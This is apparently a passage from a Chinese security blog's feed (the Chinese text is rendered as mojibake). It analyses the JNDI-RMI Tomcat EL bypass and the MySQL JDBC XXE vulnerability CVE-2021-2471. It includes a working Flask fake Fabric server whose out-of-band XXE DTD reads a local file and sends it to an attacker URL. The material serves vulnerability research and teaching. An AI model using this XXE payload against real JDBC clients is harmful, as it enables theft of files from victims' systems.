</span>&#123;</span><br><span class="line">    <span class="comment">// We only know how to deal with &lt;code&gt;javax.naming.Reference&lt;/code&gt;s</span></span><br><span class="line">    <span class="comment">// that specify a class name of &quot;javax.sql.DataSource&quot;</span></span><br><span class="line">    <span class="keyword">if</span> ((obj == <span class="keyword">null</span>) || !(obj <span class="keyword">instanceof</span> Reference)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reference ref = (Reference) obj;</span><br><span class="line">    <span class="keyword">boolean</span> XA = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">boolean</span> ok = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.DataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;javax.sql.XADataSource&quot;</span>.equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">        XA = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (org.apache.tomcat.jdbc.pool.DataSource.class.getName().equals(ref.getClassName())) &#123;</span><br><span class="line">        ok = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">        log.warn(ref.getClassName()+<span class="string">&quot; is not a valid class name/type for this JNDI factory.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ALL_PROPERTIES.length; i++) &#123;</span><br><span class="line">        String propertyName = ALL_PROPERTIES[i];</span><br><span class="line">        RefAddr ra = ref.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (ra != <span class="keyword">null</span>) &#123;</span><br><span class="line">            String propertyValue = ra.getContent().toString();</span><br><span class="line">            properties.setProperty(propertyName, propertyValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,nameCtx,XA);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> createDataSource(properties,<span class="keyword">null</span>,<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> DataSource <span class="title">createDataSource</span><span class="params">(Properties properties,Context context, <span class="keyword">boolean</span> XA)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    PoolConfiguration poolProperties = DataSourceFactory.parsePoolProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (poolProperties.getDataSourceJNDI()!=<span class="keyword">null</span> &amp;&amp; poolProperties.getDataSource()==<span class="keyword">null</span>) &#123;</span><br><span class="line">        performJNDILookup(context, poolProperties);</span><br><span class="line">    &#125;</span><br><span class="line">    org.apache.tomcat.jdbc.pool.DataSource dataSource = XA?</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.XADataSource(poolProperties) :</span><br><span class="line">            <span class="keyword">new</span> org.apache.tomcat.jdbc.pool.DataSource(poolProperties);</span><br><span class="line">    <span class="comment">//initialise the pool itself</span></span><br><span class="line">    dataSource.createPool();</span><br><span class="line">    <span class="comment">// Return the configured DataSource instance</span></span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="javax-el-ELProcessor-çš„å®šä½"><a href="#javax-el-ELProcessor-çš„å®šä½" class="headerlink" title="javax.el.ELProcessor çš„å®šä½"></a>javax.el.ELProcessor çš„å®šä½</h3><p>è¿™ä¸ªåªèƒ½å½’ç»“ä¸ºç»éªŒå§ï¼ŒåŸç”Ÿjdké‡Œèƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„sinkæ¯•ç«Ÿä¸å¤šã€‚</p><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><ol><li>å¦‚æœæ˜¯bindè§¦å‘ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆä¸ä¸€æ ·?</li><li>Weblogic/jboss/Websphere ç­‰å…¶ä»–webå®¹å™¨ä¸Šå‘¢ï¼Œæ˜¯å¦ä¹Ÿæœ‰ç±»ä¼¼çš„Factoryï¼Ÿ</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡é¦–å…ˆä»‹ç»äº†ä¸€äº›å·²çŸ¥çš„çŸ¥è¯†ç‚¹ï¼š</p><ol><li>JNDI-RMI ä½ç‰ˆæœ¬æ³¨å…¥çš„é€»è¾‘</li><li>JNDI-RMI é«˜ç‰ˆæœ¬æ³¨å…¥çš„é™åˆ¶ï¼šdecodeObject é™åˆ¶äº†Reference ç±»ï¼Œä»¥åŠTomcat EL ç»•è¿‡çš„æ–¹å¼</li></ol><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæœ¬æ–‡å°è¯•å›æº¯EL ç»•è¿‡æ–¹å¼çš„å‘ç°æ€è·¯</p><ol><li>é¦–å…ˆå¯»æ‰¾èƒ½å¤Ÿçªç ´decodeObject é™åˆ¶çš„Reference å­ç±»</li><li>å¯»æ‰¾èƒ½å¤Ÿåˆ©ç”¨çš„Factory</li></ol><p>æœ€ç»ˆæˆåŠŸå›æº¯å‡ºäº†EL ç»•è¿‡æ–¹å¼ï¼Œä»¥åŠä¸€äº›å…¶ä»–çš„é¸¡è‚‹å§¿åŠ¿ï¼Œé¢‡æœ‰æ”¶è·ã€‚</p><p>@20220318</p><p>è†œä¸€ä¸ªæµ…è“å¸ˆå‚…ï¼Œåœ¨BeanFactory çš„åˆ©ç”¨ä¸Šæ‰¾åˆ°äº†é™¤EL ä¹‹å¤–çš„å¤šä¸ªsinkï¼Œè¿˜æœ‰MemoryUserDatabaseFactoryã€BasicDataSourceFactory ç­‰å‡ ä¸ªå…¶ä»–çš„Factoryï¼ŒåŠŸåŠ›æ·±åšï¼Œè†œä¸€ä¸ªã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1]<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">å¦‚ä½•ç»•è¿‡é«˜ç‰ˆæœ¬JDKçš„é™åˆ¶è¿›è¡ŒJNDIæ³¨å…¥åˆ©ç”¨ (by: KINGX)</a></li><li>[2]<a href="https://tttang.com/archive/1405/#comment-12212">æ¢ç´¢é«˜ç‰ˆæœ¬ JDK ä¸‹ JNDI æ¼æ´çš„åˆ©ç”¨æ–¹æ³•(by: æµ…è“)</a></li></ul><!-- ## å…¶ä»–#### å…³äºRegistryContext#bind çš„æ”»å‡»ä»¥ä¸Šæ˜¯RegistryContext#lookup æ”»å‡»com.sun.jndi.rmi.registry.RegistryContext èƒ½bind å“ªäº›ç±»ï¼Ÿ<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(Name var1, Object var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidNameException(<span class="string">&quot;RegistryContext: Cannot bind empty name&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.registry.bind(var1.get(<span class="number">0</span>), <span class="keyword">this</span>.encodeObject(var2, var1.getPrefix(<span class="number">1</span>)));</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Remote <span class="title">encodeObject</span><span class="params">(Object var1, Name var2)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        var1 = NamingManager.getStateToBind(var1, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">        <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Remote) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Remote)var1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper((Reference)var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ReferenceWrapper(((Referenceable)var1).getReference());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;RegistryContext: object to bind must be Remote, Reference, or Referenceable&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œèƒ½å¤Ÿbindçš„æœ‰</p><ul><li>Remote</li><li>Reference</li><li>Referenceable</li></ul><p>â€“&gt;</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/pasted-203.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢çš„JNDI æ³¨å…¥çš„JDK ç‰ˆæœ¬é™åˆ¶å·²ç»è€³ç†Ÿèƒ½è¯¦äº†ï¼Œé’ˆå¯¹JNDI-RMI çš„tomcat EL ç»•è¿‡å§¿åŠ¿ä¹Ÿè¢«ç»å¸¸æèµ·ï¼Œæœ¬æ–‡å°è¯•å›æº¯è¿™ä¸€å§¿åŠ¿çš„å‘ç°è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;JNDI-RMI-æ³¨å…¥&quot;&gt;&lt;a href=&quot;#JNDI-RMI-æ³¨å…¥&quot; class=&quot;headerlink&quot; title=&quot;JNDI-RMI æ³¨å…¥&quot;&gt;&lt;/a&gt;JNDI-RMI æ³¨å…¥&lt;/h2&gt;&lt;h3 id=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;/a&gt;èƒŒæ™¯çŸ¥è¯†&lt;/h3&gt;&lt;p&gt;å¿…é¡»äº†è§£ä¸¤ä¸ªé‡è¦çš„ç±»&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;com.sun.jndi.rmi.registry.RegistryContextï¼š JNDI-RMIæ¥å£&lt;/li&gt;
&lt;li&gt;java.rmi.registry.Registryï¼š RMI æ¥å£&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é€šå¸¸æ”»å‡»åœºæ™¯ä¸‹ï¼ŒRegistryæ˜¯ä½œä¸ºRMIæœåŠ¡ç«¯ï¼ŒRegistryContextæ˜¯ä½œä¸ºæ”»å‡»çš„clientç«¯ï¼Œä¹Ÿå°±æ˜¯vulnã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="JNDI" scheme="http://m0d9.me/tags/JNDI/"/>
    
    <category term="RMI" scheme="http://m0d9.me/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL with CVE-2021-2471</title>
    <link href="http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/"/>
    <id>http://m0d9.me/2021/11/01/CodeQL-CVE-2021-2471/</id>
    <published>2021-11-01T13:19:00.000Z</published>
    <updated>2021-11-12T08:34:13.369Z</updated>
    
    <content type="html"><![CDATA[<p>pyn3rdå¸ˆå‚…çš„ã€ŠMake JDBC Attack Brilliant Againã€‹ä¸­æœ‰ä¸€ä¸ª0dayæ˜¯mysql jdbc xxeï¼Œthread3amå¸ˆå‚…ä¹Ÿæ—©å°±å¤ç°å‡ºæ¥äº†ï¼Œè€Œä¸”è¿˜å‘ç°äº†h2çš„xxeã€‚è†œä¸€ä¸ªï¼Œå¸ˆå‚…ä»¬éƒ½å¤ªğŸ‚ğŸºäº†ã€‚å¾ˆå¤šå¸ˆå‚…ä»¬ä¹Ÿå¤ç°äº†ï¼Œå†è®²ä¹Ÿæ²¡å•¥æ„æ€äº†ï¼Œç”¨CodeQLæ•´ç‚¹æ–°çš„å§ã€‚</p><ol><li><p>CVE-2021-2471 mysql jdbc xxeåœ¨HITB ppté‡Œé¢ï¼Œæ²¡æœ‰è®²DOMSource XXEè¿™ä¸€éƒ¨åˆ†ï¼ŒåŸå› åº”è¯¥æ˜¯pyn3rdå¸ˆå‚…ææ¼æ´è¿˜æœªå…¬å¼€ï¼Œæ²¡å†™åœ¨ppté‡Œé¢ã€‚æ‰€ä»¥è¿™ä¸ªæ´æœ‰ä¸¤ä¸ªä¸œè¥¿ï¼š</p><p> a. DOMSource XXE, å½±å“æ‰€æœ‰ç‰ˆæœ¬ï¼Œå®˜æ–¹8.0.27ä¸­ä¿®å¤æ‰äº†</p><p> b. Fabric XXE, å½±å“5.x, åœ¨5.1.49ä¸­ä¿®å¤</p></li><li><p>CodeQL CWE-611æœ‰XXEçš„æ£€æµ‹pocï¼Œä¸è¿‡sourceæºä¸æ”¯æŒmysqlã€‚</p></li></ol><h2 id="CVE-2021-2471"><a href="#CVE-2021-2471" class="headerlink" title="CVE-2021-2471"></a>CVE-2021-2471</h2><h3 id="DOMSource-XXE"><a href="#DOMSource-XXE" class="headerlink" title="DOMSource XXE"></a>DOMSource XXE</h3><p>æ¼æ´ä»£ç åœ¨ com.mysql.cj.jdbc.MysqlSQLXML#getSource</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Source&gt; <span class="function">T <span class="title">getSource</span><span class="params">(Class&lt;T&gt; clazz)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    checkClosed();</span><br><span class="line">    checkWorkingWithResult();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note that we try and use streams here wherever possible for the day that the server actually supports streaming from server -&gt; client</span></span><br><span class="line">    <span class="comment">// (futureproofing)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span> || clazz.equals(SAXSource.class)) &#123;</span><br><span class="line"></span><br><span class="line">        InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> SAXSource(inputSource);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(DOMSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">            builderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder builder = builderFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">            InputSource inputSource = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                inputSource = <span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> DOMSource(builder.parse(inputSource));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(t.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, t, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StreamSource.class)) &#123;</span><br><span class="line">        Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">            reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T) <span class="keyword">new</span> StreamSource(reader);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz.equals(StAXSource.class)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Reader reader = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.fromResultSet) &#123;</span><br><span class="line">                reader = <span class="keyword">this</span>.owningResultSet.getCharacterStream(<span class="keyword">this</span>.columnIndexOfXml);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                reader = <span class="keyword">new</span> StringReader(<span class="keyword">this</span>.stringRep);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (T) <span class="keyword">new</span> StAXSource(<span class="keyword">this</span>.inputFactory.createXMLStreamReader(reader));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XMLStreamException ex) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(ex.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, ex, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;MysqlSQLXML.2&quot;</span>, <span class="keyword">new</span> Object[] &#123; clazz.toString() &#125;),</span><br><span class="line">                MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„XXEäº†ï¼ˆStAXSourceä¸èƒ½åˆ©ç”¨ï¼‰</p><p>POCç”¨thread3amæ˜¯å¦çš„ï¼Œè§å‚è€ƒã€5ã€‘</p><p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼Œä¹Ÿæ¯”è¾ƒç®€å•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse:327, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">getSource:225, MysqlSQLXML (com.mysql.cj.jdbc)</span><br><span class="line">main:33, OracleJDBC (com.m0d9.sec.jdbc.mssql)</span><br></pre></td></tr></table></figure><h3 id="Fabric-XXE"><a href="#Fabric-XXE" class="headerlink" title="Fabric XXE"></a>Fabric XXE</h3><p>æ¼æ´è§¦å‘ä»£ç åœ¨ com.mysql.fabric.xmlrpc.Client#execute</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodResponse <span class="title">execute</span><span class="params">(MethodCall methodCall)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException, MySQLFabricException </span>&#123;</span><br><span class="line">    HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      connection = (HttpURLConnection)<span class="keyword">this</span>.url.openConnection();</span><br><span class="line">      connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;MySQL XML-RPC&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">      connection.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">      connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">      connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : <span class="keyword">this</span>.headers.entrySet()) &#123;</span><br><span class="line">        connection.setRequestProperty((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      String out = methodCall.toString();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      OutputStream os = connection.getOutputStream();</span><br><span class="line">      os.write(out.getBytes());</span><br><span class="line">      os.flush();</span><br><span class="line">      os.close();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      InputStream is = connection.getInputStream();</span><br><span class="line">      SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      ResponseParser saxp = <span class="keyword">new</span> ResponseParser();</span><br><span class="line">      </span><br><span class="line">      parser.parse(is, saxp);</span><br><span class="line">      </span><br><span class="line">      is.close();</span><br><span class="line">      </span><br><span class="line">      MethodResponse resp = saxp.getMethodResponse();</span><br><span class="line">      <span class="keyword">if</span> (resp.getFault() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MySQLFabricException(resp.getFault());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>åŸç†é€»è¾‘pyn3rd å¸ˆå‚…PPTç»™å‡ºæ¥äº†ï¼Œfake mysql fabric server ä»£ç ä¹Ÿç»™å‡ºæ¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/xxe.dtd&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxe_oob</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;!ENTITY % aaaa SYSTEM &quot;fiLe:///tmp/data&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % demo &quot;&lt;!ENTITY bbbb SYSTEM</span></span><br><span class="line"><span class="string">&#x27;http://127,0.0.1:5000/xxe?data=%aaaa;&#x27;&gt;&quot;&gt; %demo;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dtd</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % xd SYSTEM &quot;http://127.0.0.1:5000/xxe.dtd&quot;&gt; %xd;]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;bbbb;&lt;/root&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>è°ƒç”¨æ ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">execute:91, Client (com.mysql.fabric.xmlrpc)</span><br><span class="line">call:113, InternalXmlRpcMethodCaller (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">errorSafeCallMethod:151, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:200, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:220, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">refreshState:71, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:46, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:203, FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">&lt;init&gt;:93, 